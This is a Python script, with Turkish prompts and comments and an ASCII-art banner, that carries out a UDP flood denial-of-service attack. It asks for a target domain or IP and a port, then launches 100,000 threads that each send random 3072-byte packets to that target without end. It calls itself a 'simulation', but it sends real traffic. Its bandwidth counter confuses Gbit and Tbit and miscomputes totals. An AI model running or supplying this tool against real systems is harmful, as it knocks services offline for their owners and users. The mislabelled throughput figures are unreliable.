import socket 
import random
import threading
import time
import sys

# ASCII Sanatı
ascii_art = r"""
  ____              _            _       __       __           
 ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
█  █ ▀  █ █   █  █  █  █ ▀  █ █ ▄▀   █ █      █ █ █   ▐ 
▐  █    █ ▐   █  ▐  ▐  █    █ ▐ █    █ █      █    ▀▄   
  █    █      █       █    █    █    █ ▀▄    ▄▀ ▀▄   █  
▄▀   ▄▀    ▄▀▀▀▀▀▄  ▄▀   ▄▀    ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
█    █    █       █ █    █    █     ▐            ▐      
▐    ▐    ▐       ▐ ▐    ▐    ▐                          
"""

# Renk Tanımları
class Renkler:
    YESIL = "\033[92m"
    KIRMIZI = "\033[91m"
    SARı = "\033[93m"
    RESET = "\033[0m"

# Hedef Domain veya IP kullanıcıdan alınır
hedef_adres = input(f"{Renkler.SARı}Hedef domain veya IP adresini girin: {Renkler.RESET}")

# Domain adresini IP'ye çevir
try:
    hedef_ip = socket.gethostbyname(hedef_adres)
except socket.gaierror:
    print(f"{Renkler.KIRMIZI}Hedef adres çözümlenemedi. Lütfen geçerli bir domain girin.{Renkler.RESET}")
    sys.exit()

hedef_port = int(input(f"{Renkler.SARı}Hedef Port numarasını girin: {Renkler.RESET}"))

# Hedef Bant Genişliği
hedef_bant_genisligi = 10000000000  # 10 Gbit/s (10000 Mbit/s) hedef

# Paket boyutu
paket_boyutu = 3072  # byte

# UDP Paket Gönderme Fonksiyonu
def udp_paket_gonder():
    soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    veri_gonderilecek = random._urandom(paket_boyutu)
    while True:
        soket.sendto(veri_gonderilecek, (hedef_ip, hedef_port))
        print(f"{Renkler.YESIL}Paket gönderildi: {hedef_ip}:{hedef_port}{Renkler.RESET}", end='\r')

# Bant genişliğini artırmak için çoklu thread
def selam_ver(num_thread):
    threadler = []
    toplam_gonderilen = 0
    for _ in range(num_thread):
        thread = threading.Thread(target=udp_paket_gonder)
        threadler.append(thread)
        thread.start()
    while toplam_gonderilen < hedef_bant_genisligi:
        time.sleep(0.1)
        toplam_gonderilen += num_thread * paket_boyutu * 8 / 1e9  # Tbit/sn
        print(f"{Renkler.SARı}Toplam Gönderilen: {toplam_gonderilen:.2f} Tbit{Renkler.RESET}", end='\r')
    for thread in threadler:
        thread.join()

if __name__ == "__main__":
    print(ascii_art)
    num_thread = 100000
    print(f"{Renkler.KIRMIZI}UDP flood simülasyonu {num_thread} thread ile başlatılıyor...{Renkler.RESET}")
    selam_ver(num_thread)
